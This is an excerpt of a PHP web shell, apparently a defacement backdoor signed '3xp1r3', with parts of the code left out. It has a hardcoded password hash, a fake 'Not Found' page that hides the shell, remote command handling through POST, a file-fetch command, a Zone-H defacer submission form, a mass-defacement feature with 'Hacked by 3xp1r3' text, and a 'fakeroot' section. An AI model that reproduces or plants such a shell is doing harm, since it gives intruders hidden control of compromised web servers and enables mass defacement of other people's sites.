...
$password = "e863bda06ae03910640f9382a6ec7fe6"; //3CA
...
<h1>Not Found</h1>
<p>The requested URL indo2.php was not found on this server.</p><hr>
...
function getfile($name) {
	if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't 3ca $name."));
	...
	if(isset($_GET['do'])) {
		if($_GET['do'] === "cmd") {
			if(isset($_POST['cmd'])) {
				...
				elseif(preg_match("/^3ca (.*)$/", $_POST['cmd'], $match)) {
					tools("3ca", $match[1]);
				}
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='3xp1r3'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by 3xp1r3</textarea><br>
		...
		elseif($_GET['do'] == 'fakeroot') {
			...
			if($_POST['reverse']) {
				...
				print "<center><form method='post'>
				Filename: <br><input type='text' name='file' value='3ca.html' size='50' height='10'><br>
